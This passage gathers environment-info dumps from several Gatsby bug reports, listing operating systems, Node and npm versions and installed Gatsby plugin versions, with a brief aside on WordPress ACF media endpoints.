2.4.5 gatsby-remark-smartypants: ^2.3.4 => 2.3.4 gatsby-remark-unwrap-images: ^1.0.2 => 1.0.2 gatsby-source-filesystem: ^2.3.11 => 2.3.11 gatsby-transformer-json: ^2.4.5 => 2.4.5 gatsby-transformer-remark: ^2.8.15 => 2.8.15 gatsby-transformer-sharp: ^2.5.5 => 2.5.5
``` system: os: macos 10.15.5 cpu: (16) x64 intel(r) core(tm) i9-9980hk cpu @ 2.40ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.4.0 - /usr/local/bin/node yarn: 1.22.4 - ~/.yarn/bin/yarn npm: 6.14.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.116 firefox: 77.0.1 safari: 13.1.1 npmpackages: gatsby: ^2.0.76 => 2.23.11 gatsby-awesome-pagination: ^0.3.3 => 0.3.6 gatsby-image: ^2.0.20 => 2.4.9 gatsby-plugin-draft: ^0.0.4 => 0.0.4 gatsby-plugin-feed: ^2.3.20 => 2.5.7 gatsby-plugin-google-analytics: ^2.0.17 => 2.3.6 gatsby-plugin-manifest: ^2.0.9 => 2.4.14 gatsby-plugin-netlify: ^2.0.12 => 2.3.7 gatsby-plugin-offline: ^3.2.13 => 3.2.13 gatsby-plugin-postcss: ^2.0.2 => 2.3.6 gatsby-plugin-react-helmet: ^3.0.2 => 3.3.6 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.1 gatsby-plugin-sharp: ^2.0.17 => 2.6.14 gatsby-plugin-webpack-bundle-analyzer: ^1.0.5 => 1.0.5 gatsby-remark-code-titles: ^1.1.0-rc.0 => 1.1.0 gatsby-remark-copy-linked-files: ^2.0.9 => 2.3.7 gatsby-remark-embed-gist: ^1.1.6 => 1.2.0 gatsby-remark-embed-video: ^1.7.0 => 1.7.1 gatsby-remark-external-links: ^0.0.4 => 0.0.4 gatsby-remark-footnotes: ^0.0.7 => 0.0.7 gatsby-remark-images: ^3.0.1 => 3.3.13 gatsby-remark-numbered-footnotes: ^1.0.1 => 1.0.1 gatsby-remark-prismjs: ^3.2.0 => 3.5.6 gatsby-remark-responsive-iframe: ^2.1.1 => 2.4.7 gatsby-source-filesystem: ^2.0.8 => 2.3.14 gatsby-transformer-remark: ^2.1.19 => 2.8.19 gatsby-transformer-sharp: ^2.1.8 => 2.5.7 ```
``` system: os: linux 4.19 debian gnu/linux 10 (buster) 10 (buster) cpu: (8) x64 intel(r) xeon(r) cpu @ 2.30ghz shell: 5.0.3 - /bin/bash binaries: node: 14.4.0 - /usr/bin/node yarn: 1.22.4 - /usr/bin/yarn npm: 6.14.5 - /usr/bin/npm languages: python: 2.7.16 - /usr/bin/python
``` (gatsby version corresponds to `master` built from source)
``` system: os: linux 4.19 debian gnu/linux 10 (buster) 10 (buster) cpu: (8) x64 intel(r) xeon(r) cpu @ 2.30ghz shell: 5.0.3 - /bin/bash binaries: node: 14.4.0 - /usr/bin/node yarn: 1.21.0 - /usr/bin/yarn npm: 6.14.5 - /usr/bin/npm languages: python: 2.7.16 - /usr/bin/python
system: os: linux 5.6 fedora 30 (workstation edition) 30 (workstation edition) cpu: (8) x64 intel(r) core(tm) i7-3770k cpu @ 3.50ghz shell: 5.0.11 - /bin/bash binaries: node: 12.18.1 - /usr/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.5 - /usr/local/bin/npm languages: python: 2.7.18 - /usr/bin/python browsers: chrome: beta firefox: 76.0 npmpackages: gatsby: ^2.23.10 => 2.23.10 gatsby-image: ^2.4.8 => 2.4.8 gatsby-plugin-feed: ^2.5.6 => 2.5.6 gatsby-plugin-google-analytics: ^2.3.5 => 2.3.5 gatsby-plugin-manifest: ^2.4.13 => 2.4.13 gatsby-plugin-offline: ^3.2.12 => 3.2.12 gatsby-plugin-react-helmet: ^3.3.5 => 3.3.5 gatsby-plugin-sharp: ^2.6.13 => 2.6.13 gatsby-plugin-typography: ^2.5.5 => 2.5.5 gatsby-remark-copy-linked-files: ^2.3.6 => 2.3.6 gatsby-remark-images: ^3.3.12 => 3.3.12 gatsby-remark-prismjs: ^3.5.5 => 3.5.5 gatsby-remark-responsive-iframe: ^2.4.6 => 2.4.6 gatsby-remark-smartypants: ^2.3.5 => 2.3.5 gatsby-source-filesystem: ^2.3.13 => 2.3.13 gatsby-transformer-remark: ^2.8.18 => 2.8.18 gatsby-transformer-sharp: ^2.5.6 => 2.5.6 npmglobalpackages: gatsby-cli: 2.12.21 gatsby: 2.23.1 thanks for looking into this!
system: os: macos 10.15.5 cpu: (16) x64 intel(r) core(tm) i9-9880h cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.16.0 - ~/.nvm/versions/node/v12.16.0/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.16.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.116 firefox: 77.0.1 safari: 13.1.1 npmpackages: gatsby: ^2.23.11 => 2.23.11 gatsby-image: ^2.4.0 => 2.4.0 gatsby-plugin-feed: ^2.5.0 => 2.5.0 gatsby-plugin-google-analytics: ^2.3.0 => 2.3.0 gatsby-plugin-manifest: ^2.4.0 => 2.4.1 gatsby-plugin-offline: ^3.2.0 => 3.2.0 gatsby-plugin-preact: ^4.0.5 => 4.0.5 gatsby-plugin-react-helmet: ^3.3.0 => 3.3.0 gatsby-plugin-sharp: ^2.6.0 => 2.6.0 gatsby-plugin-typography: ^2.5.0 => 2.5.0 gatsby-remark-copy-linked-files: ^2.3.0 => 2.3.1 gatsby-remark-images: ^3.3.0 => 3.3.0 gatsby-remark-prismjs: ^3.5.0 => 3.5.0 gatsby-remark-responsive-iframe: ^2.4.0 => 2.4.1 gatsby-remark-smartypants: ^2.3.0 => 2.3.0 gatsby-source-filesystem: ^2.3.0 => 2.3.0 gatsby-transformer-remark: ^2.8.0 => 2.8.0 gatsby-transformer-sharp: ^2.5.0 => 2.5.0
system: os: windows 10 10.0.18362 cpu: (16) x64 amd ryzen 7 3700x 8-core processor binaries: node: 12.14.1 - d:\\software\\applications\ odejs\ ode.exe npm: 6.13.4 - d:\\software\\applications\ odejs\ pm.cmd languages: python: 3.8.1 browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.23.11 => 2.23.11 gatsby-plugin-root-import: ^2.0.5 => 2.0.5 npmglobalpackages: gatsby-cli: 2.12.37
``` system: os: linux 5.4 kde neon 5.19 cpu: (4) x64 intel(r) core(tm) i5-6400t cpu @ 2.20ghz shell: 4.4.20 - /bin/bash binaries: node: 12.18.1 - /tmp/yarn--1593200298393-0.5385115370476083/node yarn: 1.22.4 - /tmp/yarn--1593200298393-0.5385115370476083/yarn npm: 6.14.5 - /usr/bin/npm languages: python: 2.7.17 - /usr/bin/python browsers: chrome: dev firefox: 77.0.1 npmpackages: gatsby: 2.23 => 2.23.11 gatsby-source-filesystem: ^2.3.13 => 2.3.14 gatsby-transformer-json: ^2.4.7 => 2.4.7 ```
``` system: os: macos 10.15.5 cpu: (4) x64 intel(r) core(tm) i7-6567u cpu @ 3.30ghz shell: 5.5.1 - /usr/local/bin/zsh binaries: node: 13.12.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.5 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.116 firefox: 77.0 safari: 13.1.1 ``` ### related issue links not working after period of inactivity: my comment on the issue: #issuecomment-647001631
system: os: linux 4.19 ubuntu 20.04 lts (focal fossa) cpu: (8) x64 intel(r) core(tm) i5-8250u cpu @ 1.60ghz shell: 5.0.16 - /bin/bash binaries: node: 10.19.0 - /usr/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.4 - /usr/bin/npm npmpackages: gatsby: 2.23.3 => 2.23.1 gatsby-link: 2.4.6 => 2.4.5 gatsby-plugin-algolia: 0.11.1 => 0.11.1 gatsby-plugin-canonical-urls: 2.3.4 => 2.3.3 gatsby-plugin-emotion: 4.3.4 => 4.3.3 gatsby-plugin-feed: 2.5.5 => 2.5.4 gatsby-plugin-gtag: 1.0.13 => 1.0.13 gatsby-plugin-layout: 1.3.4 => 1.3.3 gatsby-plugin-manifest: 2.4.11 => 2.4.10 gatsby-plugin-mdx: 1.2.15 => 1.2.14 gatsby-plugin-offline: 3.2.9 => 3.2.8 gatsby-plugin-page-progress: 2.1.0 => 2.1.0 gatsby-plugin-react-helmet: 3.3.4 => 3.3.3 gatsby-plugin-react-svg: 3.0.0 => 3.0.0 gatsby-plugin-remove-trailing-slashes: 2.3.5 => 2.3.4 gatsby-plugin-root-import: 2.0.5 => 2.0.5 gatsby-plugin-sass: 2.3.4 => 2.3.3 gatsby-plugin-sharp: 2.6.11 => 2.6.10 gatsby-plugin-sitemap: 2.4.5 => 2.4.4 gatsby-remark-copy-linked-files: 2.3.5 => 2.3.4 gatsby-remark-embed-snippet: 4.3.5 => 4.3.3 gatsby-remark-embedder: 2.1.1 => 2.1.1 gatsby-remark-graphviz: 1.3.4 => 1.3.3 gatsby-remark-images: 3.3.10 => 3.3.9 gatsby-remark-jargon: 2.6.0 => 2.6.0 gatsby-remark-mermaid: 2.0.0 => 2.0.0 gatsby-source-filesystem: 2.3.11 => 2.3.10 gatsby-source-local-git: 1.0.0 => 1.0.0 gatsby-transformer-gitinfo: 1.1.0 => 1.1.0 gatsby-transformer-sharp: 2.5.5 => 2.5.4 npmglobalpackages: gatsby-cli: 2.12.37
system: os: windows 10 10.0.19041 cpu: (12) x64 amd ryzen 5 3600 6-core processor binaries: node: 12.17.0 - c:\\program files\ odejs\ ode.exe yarn: 1.22.4 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.14.4 - c:\\program files\ odejs\ pm.cmd browsers: edge: 44.19041.1.0 npmpackages: gatsby: ^2.23.11 => 2.23.11 gatsby-image: ^2.4.9 => 2.4.9 gatsby-node-helpers: ^0.3.0 => 0.3.0 gatsby-plugin-emotion: ^4.3.6 => 4.3.6 gatsby-plugin-google-analytics: ^2.3.6 => 2.3.6 gatsby-plugin-google-tagmanager: ^2.3.7 => 2.3.7 gatsby-plugin-manifest: ^2.4.14 => 2.4.14 gatsby-plugin-offline: ^3.1.2 => 3.2.1 gatsby-plugin-react-helmet: ^3.3.4 => 3.3.4 gatsby-plugin-sharp: ^2.6.14 => 2.6.14 gatsby-plugin-sitemap: ^2.4.7 => 2.4.7 gatsby-plugin-webfonts: ^1.1.2 => 1.1.2 gatsby-source-filesystem: ^2.2.2 => 2.3.1 gatsby-transformer-remark: ^2.7.1 => 2.8.7 gatsby-transformer-sharp: ^2.5.7 => 2.5.7 npmglobalpackages: gatsby-cli: 2.12.51
``` system: os: macos 10.15.5 cpu: (8) x64 intel(r) core(tm) i7-4750hq cpu @ 2.00ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.4.0 - ~/.nvm/versions/node/v12.4.0/bin/node yarn: 1.22.4 - ~/.nvm/versions/node/v12.4.0/bin/yarn npm: 6.10.0 - ~/.nvm/versions/node/v12.4.0/bin/npm languages: python: 2.7.17 - /usr/local/bin/python browsers: chrome: 83.0.4103.116 safari: 13.1.1 npmpackages: gatsby: ^2.23.11 => 2.23.11 gatsby-image: ^2.2.29 => 2.2.37 gatsby-plugin-google-analytics: ^2.0.13 => 2.1.23 gatsby-plugin-layout: ^1.0.11 => 1.1.13 gatsby-plugin-manifest: ^2.2.23 => 2.2.34 gatsby-plugin-offline: ^3.0.16 => 3.0.30 gatsby-plugin-react-helmet: ^3.1.13 => 3.1.18 gatsby-plugin-root-import: ^2.0.5 => 2.0.5 gatsby-plugin-sharp: ^2.2.32 => 2.3.10 gatsby-source-filesystem: ^2.1.33 => 2.1.33 gatsby-source-shopify: ^3.0.24 => 3.0.37 gatsby-transformer-sharp: ^2.3.0 => 2.3.9 information from vscode version: 1.46.1 commit: cd9ea6488829f560dc949a8b2fb789f3cdc05f5d date: 2020-06-17t21:17:14.222z (1 wk ago) electron: 7.3.1 chrome: 78.0.3904.130 node.js: 12.8.1 v8: 7.8.279.23-electron.0 os: darwin x64 19.5.0
os: macos 10.15.4
cpu: (8) x64 intel(r) core(tm) i5-8279u cpu @ 2.40ghz
shell: 5.7.1 - /bin/zsh
node: 12.18.1 - ~/.nvm/versions/node/v12.18.1/bin/node
yarn: 1.22.4 - /usr/local/bin/yarn
npm: 6.14.5 - ~/.nvm/versions/node/v12.18.1/bin/npm
python: 2.7.16 - /usr/bin/python
chrome: 83.0.4103.116
safari: 13.1
npmpackages:
gatsby: ^2.19.7 => 2.23.11
gatsby-background-image: ^0.10.2 => 0.10.2
gatsby-cli: ^2.10.9 => 2.12.51
gatsby-image: ^2.2.39 => 2.4.9
gatsby-plugin-env-variables: ^1.0.1 => 1.0.2
gatsby-plugin-google-analytics: ^2.2.2 => 2.3.6
gatsby-plugin-google-fonts: ^1.0.1 => 1.0.1
gatsby-plugin-manifest: ^2.2.39 => 2.4.14
gatsby-plugin-offline: ^3.0.32 => 3.2.13
gatsby-plugin-prefetch-google-fonts: ^1.4.3 => 1.4.3
gatsby-plugin-react-helmet: ^3.1.21 => 3.3.6
gatsby-plugin-robots-txt: ^1.5.0 => 1.5.1
gatsby-plugin-sass: ^2.1.30 => 2.3.6
gatsby-plugin-sharp: ^2.4.3 => 2.6.14
gatsby-plugin-sitemap: ^2.3.1 => 2.4.7
gatsby-plugin-transition-link: ^1.18.0 => 1.20.2
gatsby-source-filesystem: ^2.1.46 => 2.3.14
gatsby-transformer-sharp: ^2.3.13 => 2.5.7
system: os: macos 10.15.4 cpu: (8) x64 intel(r) core(tm) i5-8279u cpu @ 2.40ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.18.1 - ~/.nvm/versions/node/v12.18.1/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.5 - ~/.nvm/versions/node/v12.18.1/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.116 safari: 13.1 npmpackages: gatsby: ^2.19.7 => 2.23.11 gatsby-background-image: ^0.10.2 => 0.10.2 gatsby-cli: ^2.10.9 => 2.12.51 gatsby-image: ^2.2.39 => 2.4.9 gatsby-plugin-env-variables: ^1.0.1 => 1.0.2 gatsby-plugin-google-analytics: ^2.2.2 => 2.3.6 gatsby-plugin-google-fonts: ^1.0.1 => 1.0.1 gatsby-plugin-manifest: ^2.2.39 => 2.4.14 gatsby-plugin-offline: ^3.0.32 => 3.2.13 gatsby-plugin-prefetch-google-fonts: ^1.4.3 => 1.4.3 gatsby-plugin-react-helmet: ^3.1.21 => 3.3.6 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.1 gatsby-plugin-sass: ^2.1.30 => 2.3.6 gatsby-plugin-sharp: ^2.4.3 => 2.6.14 gatsby-plugin-sitemap: ^2.3.1 => 2.4.7 gatsby-plugin-transition-link: ^1.18.0 => 1.20.2 gatsby-source-filesystem: ^2.1.46 => 2.3.14 gatsby-transformer-sharp: ^2.3.13 => 2.5.7
system: os: macos mojave 10.14.6 cpu: (8) x64 intel(r) core(tm) i5-8259u cpu @ 2.30ghz shell: 3.2.57 - /bin/bash binaries: node: 12.14.1 - ~/.nvm/versions/node/v12.14.1/bin/node yarn: 1.22.4 - ~/.nvm/versions/node/v12.14.1/bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v12.14.1/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 83.0.4103.116 firefox: 76.0.1 safari: 13.0.5 npmpackages: gatsby: ^2.17.4 => 2.17.4 gatsby-image: ^2.2.29 => 2.2.29 gatsby-plugin-google-analytics: ^2.0.13 => 2.1.23 gatsby-plugin-layout: ^1.0.11 => 1.1.13 gatsby-plugin-manifest: ^2.2.23 => 2.2.23 gatsby-plugin-netlify-cms: ^4.3.0 => 4.3.0 gatsby-plugin-netlify-identity-widget: ^1.1.1 => 1.1.1 gatsby-plugin-offline: ^3.0.16 => 3.0.16 gatsby-plugin-react-helmet: ^3.1.13 => 3.1.13 gatsby-plugin-react-svg: ^3.0.0 => 3.0.0 gatsby-plugin-root-import: ^2.0.5 => 2.0.5 gatsby-plugin-sharp: ^2.2.32 => 2.2.32 gatsby-remark-images: ^3.3.11 => 3.3.11 gatsby-remark-relative-images: ^0.3.0 => 0.3.0 gatsby-source-filesystem: ^2.1.33 => 2.1.33 gatsby-source-shopify: ^3.2.14 => 3.2.14 gatsby-transformer-json: ^2.3.3 => 2.3.3 gatsby-transformer-remark: ^2.8.0 => 2.8.0 gatsby-transformer-sharp: ^2.3.0 => 2.3.0 npmglobalpackages: gatsby-cli: 2.12.1
system: os: macos 10.15.5 cpu: (8) x64 intel(r) core(tm) i7-4770hq cpu @ 2.20ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.9.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.5 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.116 firefox: 76.0.1 safari: 13.1.1 npmpackages: gatsby: ^2.22.10 => 2.22.10 gatsby-cli: ^2.12.51 => 2.12.51 gatsby-image: ^2.4.5 => 2.4.5 gatsby-plugin-cookiehub-banner: ^0.1.0 => 0.1.0 gatsby-plugin-google-analytics-gdpr: 0.0.5 => 0.0.5 gatsby-plugin-google-fonts: ^1.0.1 => 1.0.1 gatsby-plugin-manifest: ^2.4.9 => 2.4.9 gatsby-plugin-mdx: ^1.2.17 => 1.2.17 gatsby-plugin-offline: ^3.2.7 => 3.2.7 gatsby-plugin-react-helmet: ^3.3.2 => 3.3.2 gatsby-plugin-sass: ^2.3.2 => 2.3.2 gatsby-plugin-sharp: ^2.6.9 => 2.6.9 gatsby-plugin-sitemap: ^2.4.3 => 2.4.3 gatsby-remark-copy-linked-files: ^2.3.5 => 2.3.5 gatsby-remark-images: ^3.3.8 => 3.3.8 gatsby-source-filesystem: ^2.3.8 => 2.3.8 gatsby-transformer-sharp: ^2.5.3 => 2.5.3 npmglobalpackages: gatsby-cli: 2.7.37
system: os: macos high sierra 10.13.6 cpu: (4) x64 intel(r) core(tm) i5-2400s cpu @ 2.50ghz shell: 3.2.57 - /bin/bash binaries: node: 11.13.0 yarn: 1.16.0 npm: 6.14.4 languages: python: 2.7.16 browsers: chrome: 83.0.4103.116 firefox: 76.0.1 safari: 13.1.1 npmpackages: gatsby: 2.23.11 => 2.23.11 gatsby-core-utils: ^1.3.8 => 1.3.8 gatsby-image: ^2.4.9 => 2.4.9 gatsby-plugin-advanced-sitemap: ^1.5.5 => 1.5.5 gatsby-plugin-eslint: 2.0.8 => 2.0.8 gatsby-plugin-google-analytics: ^2.3.6 => 2.3.6 gatsby-plugin-manifest: 2.4.14 => 2.4.14 gatsby-plugin-offline: ^3.2.13 => 3.2.13 gatsby-plugin-postcss: 2.3.6 => 2.3.6 gatsby-plugin-react-helmet: 3.3.6 => 3.3.6 gatsby-plugin-robots-txt: ^1.5.1 => 1.5.1 gatsby-plugin-sass: ^2.3.6 => 2.3.6 gatsby-plugin-sharp: ^2.6.14 => 2.6.14 gatsby-source-filesystem: ^2.3.14 => 2.3.14 gatsby-source-graphql: ^2.5.7 => 2.5.7 gatsby-source-wordpress: ^3.3.15 => 3.3.15 gatsby-source-wordpress-experimental: ^0.7.11 => 0.7.11 gatsby-transformer-sharp: ^2.5.7 => 2.5.7 gatsby-wpgraphql-inline-images: ^0.2.5 => 0.2.5 npmglobalpackages: gatsby-cli: 2.11.3
``` definition of `wordpress__wp_mediafilterinput `
![screen shot 2020-06-24 at 18 07 55]( return of api `myblog.com/wp-json/acf/v2/media/1085`
![screen shot 2020-06-24 at 18 12 12]( `/wp-json/acf/v3/media`
![screen shot 2020-06-24 at 19 59 26]( `/wp-json/wp/v2/media/963`
acf is there on the media endpoint, but still the relationship wpmedia->acf is not there
![screen shot 2020-06-24 at 20 14 06]( i also can query the endpoint return using this graphql query:
``` allwordpressacfmedia(filter: {acf: {tags: {eq: 10}}}) { nodes { wordpress_id } }
system: os: windows 10 10.0.18363 cpu: (12) x64 amd ryzen 5 3600 6-core processor binaries: node: 12.17.0 - d:\ ode.js\ ode.exe yarn: 1.22.4 - ~\\appdata\ oaming\ pm\\yarn.cmd npm: 6.14.4 - d:\ ode.js\ pm.cmd languages: python: 3.8.3 browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.22.15 => 2.22.15 gatsby-background-image: ^1.1.1 => 1.1.1 gatsby-cli: ^2.12.43 => 2.12.43 gatsby-image: ^2.4.5 => 2.4.5 gatsby-plugin-layout: ^1.3.3 => 1.3.3 gatsby-plugin-manifest: ^2.4.9 => 2.4.9 gatsby-plugin-offline: ^3.2.7 => 3.2.7 gatsby-plugin-prefetch-google-fonts: ^1.4.3 => 1.4.3 gatsby-plugin-react-helmet: ^3.3.2 => 3.3.2 gatsby-plugin-sharp: ^2.6.9 => 2.6.9 gatsby-plugin-styled-components: ^3.3.3 => 3.3.3 gatsby-source-cloudinary: ^0.1.14 => 0.1.14 gatsby-source-filesystem: ^2.3.8 => 2.3.8 gatsby-source-googlemaps-static: ^1.1.10 => 1.1.10 gatsby-transformer-sharp: ^2.5.3 => 2.5.3 npmglobalpackages: gatsby-cli: 2.12.48
system: os: macos 10.15.4 cpu: (8) x64 intel(r) core(tm) i5-8279u cpu @ 2.40ghz shell: 5.7.1 - /bin/zsh binaries: node: 13.12.0 - ~/.nvm/versions/node/v13.12.0/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v13.12.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.106 safari: 13.1 npmpackages: gatsby: ^2.19.7 => 2.19.41 gatsby-background-image: ^0.10.2 => 0.10.2 gatsby-cli: ^2.10.9 => 2.11.1 gatsby-image: ^2.2.39 => 2.2.43 gatsby-plugin-env-variables: ^1.0.1 => 1.0.1 gatsby-plugin-google-analytics: ^2.2.2 => 2.2.2 gatsby-plugin-google-fonts: ^1.0.1 => 1.0.1 gatsby-plugin-manifest: ^2.2.39 => 2.2.47 gatsby-plugin-offline: ^3.0.32 => 3.0.40 gatsby-plugin-prefetch-google-fonts: ^1.4.3 => 1.4.3 gatsby-plugin-react-helmet: ^3.1.21 => 3.1.23 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.0 gatsby-plugin-sass: ^2.1.30 => 2.1.30 gatsby-plugin-sharp: ^2.4.3 => 2.4.12 gatsby-plugin-sitemap: ^2.3.1 => 2.3.1 gatsby-plugin-transition-link: ^1.18.0 => 1.18.0 gatsby-source-filesystem: ^2.1.46 => 2.1.54 gatsby-transformer-sharp: ^2.3.13 => 2.3.18
system: os: macos 10.15.4 cpu: (8) x64 intel(r) core(tm) i5-8279u cpu @ 2.40ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.4.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.5 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.106 safari: 13.1 npmpackages: gatsby: ^2.19.7 => 2.19.41 gatsby-background-image: ^0.10.2 => 0.10.2 gatsby-cli: ^2.10.9 => 2.11.1 gatsby-image: ^2.2.39 => 2.2.43 gatsby-plugin-env-variables: ^1.0.1 => 1.0.1 gatsby-plugin-google-analytics: ^2.2.2 => 2.2.2 gatsby-plugin-google-fonts: ^1.0.1 => 1.0.1 gatsby-plugin-offline: ^3.0.32 => 3.0.40 gatsby-plugin-prefetch-google-fonts: ^1.4.3 => 1.4.3 gatsby-plugin-react-helmet: ^3.1.21 => 3.1.23 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.0 gatsby-plugin-sass: ^2.1.30 => 2.1.30 gatsby-plugin-sitemap: ^2.3.1 => 2.3.1 gatsby-plugin-transition-link: ^1.18.0 => 1.18.0 gatsby-source-filesystem: ^2.1.46 => 2.1.54 npmglobalpackages: gatsby-cli: 2.10.9
system: os: linux 5.4 ubuntu 20.04 lts (focal fossa) cpu: (8) x64 intel(r) core(tm) i7-3615qm cpu @ 2.30ghz shell: 5.0.16 - /bin/bash binaries: node: 14.4.0 - ~/.nvm/versions/node/v14.4.0/bin/node yarn: 1.22.4 - /usr/bin/yarn npm: 6.14.5 - ~/.nvm/versions/node/v14.4.0/bin/npm npmpackages: gatsby: ^2.23.4 => 2.23.10 gatsby-cli: 2.12.45 => 2.12.45 gatsby-image: ^2.4.0 => 2.4.8 gatsby-plugin-emotion: ^4.3.0 => 4.3.5 gatsby-plugin-manifest: ^2.4.1 => 2.4.13 gatsby-plugin-offline: ^3.2.0 => 3.2.12 gatsby-plugin-react-helmet: ^3.3.0 => 3.3.5 gatsby-plugin-sharp: ^2.6.0 => 2.6.13 gatsby-plugin-tinacms: ^0.2.0 => 0.2.3 gatsby-plugin-typography: ^2.5.0 => 2.5.5 gatsby-source-filesystem: ^2.3.0 => 2.3.13 gatsby-source-googlemaps-static: ^1.1.1 => 1.1.12 gatsby-tinacms-git: ^0.5.1 => 0.5.5 gatsby-tinacms-json: ^0.8.20 => 0.8.29 gatsby-transformer-json: ^2.4.0 => 2.4.6 gatsby-transformer-opencage-geocoder: ^1.0.0 => 1.0.0 gatsby-transformer-sharp: ^2.5.0 => 2.5.6
system: os: linux 5.6 fedora 32 (workstation edition) 32 (workstation edition) cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 5.8 - /usr/bin/zsh binaries: node: 12.16.3 - /usr/bin/node yarn: 1.21.1 - /usr/bin/yarn npm: 6.14.4 - /usr/bin/npm languages: python: 3.8.3 - /usr/bin/python browsers: chrome: 83.0.4103.106 firefox: 77.0.1 npmpackages: gatsby: 2.23.9 => 2.23.9 gatsby-link: 2.4.7 => 2.4.7 gatsby-plugin-react-helmet: 3.3.5 => 3.3.5 gatsby-plugin-styled-components: 3.3.5 => 3.3.5 gatsby-source-filesystem: 2.3.13 => 2.3.13 gatsby-transformer-json: 2.4.6 => 2.4.6
``` system: os: windows 10 10.0.17763 cpu: (8) x64 amd ryzen 5 2500u with radeon vega mobile gfx binaries: node: 12.16.3 - c:\\program files\ odejs\ ode.exe yarn: 1.22.4 - ~\\appdata\ oaming\ pm\\yarn.cmd npm: 6.14.4 - c:\\program files\ odejs\ pm.cmd browsers: edge: 44.17763.1.0 npmpackages: gatsby: ^2.21.33 => 2.23.3 gatsby-image: ^2.3.4 => 2.4.7 gatsby-plugin-chakra-ui: ^0.1.4 => 0.1.4 gatsby-plugin-google-tagmanager: ^2.3.1 => 2.3.5 gatsby-plugin-manifest: ^2.3.5 => 2.4.11 gatsby-plugin-prefetch-google-fonts: ^1.4.3 => 1.4.3 gatsby-plugin-react-helmet: ^3.2.4 => 3.3.4 gatsby-plugin-sharp: ^2.5.6 => 2.6.11 gatsby-plugin-sitemap: ^2.4.4 => 2.4.5 gatsby-source-filesystem: ^2.2.4 => 2.3.11 gatsby-source-graphql: ^2.5.3 => 2.5.4 gatsby-transformer-json: ^2.4.4 => 2.4.5 gatsby-transformer-sharp: ^2.4.6 => 2.5.5 npmglobalpackages: gatsby-cli: 2.12.29
``` browsers: safari: 13.1.1
node: v10.15.3 npmpackages: gatsby: ^2.23.7 => 2.23.7 gatsby-image: ^2.4.7 => 2.4.7 gatsby-plugin-feed: ^2.5.5 => 2.5.5 gatsby-plugin-google-analytics: ^2.3.4 => 2.3.4 gatsby-plugin-google-fonts: ^1.0.1 => 1.0.1 gatsby-plugin-manifest: ^2.4.12 => 2.4.12 gatsby-plugin-mdx: ^1.2.16 => 1.2.16 gatsby-plugin-offline: ^3.2.11 => 3.2.11 gatsby-plugin-react-helmet: ^3.3.4 => 3.3.4 gatsby-plugin-sharp: ^2.6.12 => 2.6.12 gatsby-plugin-styled-components: ^3.3.4 => 3.3.4 gatsby-plugin-typography: ^2.5.4 => 2.5.4 gatsby-plugin-web-font-loader: ^1.0.4 => 1.0.4 gatsby-remark-copy-linked-files: ^2.3.5 => 2.3.5 gatsby-remark-images: ^3.3.11 => 3.3.11 ``` can't seem to puzzle this one out.
thanks so much!
system: os: linux 4.15 ubuntu 18.04.4 lts (bionic beaver) cpu: (4) x64 intel(r) core(tm) i5-3570k cpu @ 3.40ghz shell: 4.4.20 - /bin/bash binaries: node: 12.13.0 - /usr/local/bin/node npm: 6.14.5 - ~/npm-global/bin/npm languages: python: 2.7.17 - /usr/bin/python browsers: chrome: 83.0.4103.61 firefox: 76.0.1 npmpackages: gatsby: 2.23.6 => 2.23.6 gatsby-image: 2.4.7 => 2.4.7 gatsby-plugin-canonical-urls: 2.3.4 => 2.3.4 gatsby-plugin-catch-links: 2.3.5 => 2.3.5 gatsby-plugin-emotion: 4.3.4 => 4.3.4 gatsby-plugin-eslint: 2.0.8 => 2.0.8 gatsby-plugin-manifest: 2.4.12 => 2.4.12 gatsby-plugin-material-ui: 2.1.9 => 2.1.9 gatsby-plugin-mdx: 1.2.16 => 1.2.16 gatsby-plugin-nprogress: 2.3.4 => 2.3.4 gatsby-plugin-offline: 3.2.11 => 3.2.11 gatsby-plugin-page-creator: 2.3.10 => 2.3.10 gatsby-plugin-prefetch-google-fonts: 1.4.3 => 1.4.3 gatsby-plugin-ramda: 1.0.0 => 1.0.0 gatsby-plugin-react-helmet: 3.3.4 => 3.3.4 gatsby-plugin-s3: 0.3.3 => 0.3.3 gatsby-plugin-sharp: 2.6.12 => 2.6.12 gatsby-remark-autolink-headers: 2.3.5 => 2.3.5 gatsby-remark-copy-linked-files: 2.3.5 => 2.3.5 gatsby-remark-images: 3.3.11 => 3.3.11 gatsby-remark-responsive-iframe: 2.4.5 => 2.4.5 gatsby-source-filesystem: 2.3.12 